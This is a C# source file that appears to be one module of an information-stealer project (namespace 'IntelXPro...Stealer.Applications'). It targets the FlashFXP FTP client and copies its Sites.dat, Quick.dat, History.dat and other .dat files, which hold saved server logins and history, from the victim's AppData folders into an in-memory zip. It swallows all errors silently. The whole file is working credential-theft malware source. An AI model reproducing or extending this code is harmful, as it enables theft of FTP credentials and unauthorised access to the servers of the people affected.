using IntelXPro.src.IntelXPro.Dependencies.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications
{
    internal class FlashFXP : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string appDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "FlashFXP");
            string localAppDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "FlashFXP");

            Counter.CounterApplications counterApplications = new Counter.CounterApplications();
            counterApplications.Name = "FlashFXP";

            bool foundData = false;

            if (Directory.Exists(appDataPath))
            {
                foundData |= CollectFromDirectory(appDataPath, "AppData", zip, counterApplications);
            }

            if (Directory.Exists(localAppDataPath))
            {
                foundData |= CollectFromDirectory(localAppDataPath, "LocalAppData", zip, counterApplications);
            }

            if (foundData && counterApplications.Files.Count > 0)
            {
                counter.Applications.Add(counterApplications);
            }
        }

        private bool CollectFromDirectory(string basePath, string location, InMemoryZip zip, Counter.CounterApplications counterApplications)
        {
            bool foundData = false;

            try
            {
                string[] versionDirs = Directory.GetDirectories(basePath, "*", SearchOption.TopDirectoryOnly);

                foreach (string versionDir in versionDirs)
                {
                    string versionName = Path.GetFileName(versionDir);

                    string[] configFiles = new string[]
                    {
                        "Sites.dat",
                        "Quick.dat",
                        "History.dat",
                        "Stats.dat"
                    };

                    foreach (string configFile in configFiles)
                    {
                        string fullPath = Path.Combine(versionDir, configFile);
                        if (File.Exists(fullPath))
                        {
                            string zipPath = $"Applications\\FlashFXP\\{location}\\{versionName}\\{configFile}";
                            zip.AddFile(zipPath, File.ReadAllBytes(fullPath));
                            counterApplications.Files.Add(fullPath + " => " + zipPath);
                            foundData = true;
                        }
                    }

                    string[] datFiles = Directory.GetFiles(versionDir, "*.dat", SearchOption.TopDirectoryOnly);
                    
                    foreach (string file in datFiles.Take(10))
                    {
                        string fileName = Path.GetFileName(file);
                        string zipPath = $"Applications\\FlashFXP\\{location}\\{versionName}\\{fileName}";
                        zip.AddFile(zipPath, File.ReadAllBytes(file));
                        counterApplications.Files.Add(file + " => " + zipPath);
                        foundData = true;
                    }
                }
            }
            catch
            {
            }

            return foundData;
        }
    }
}
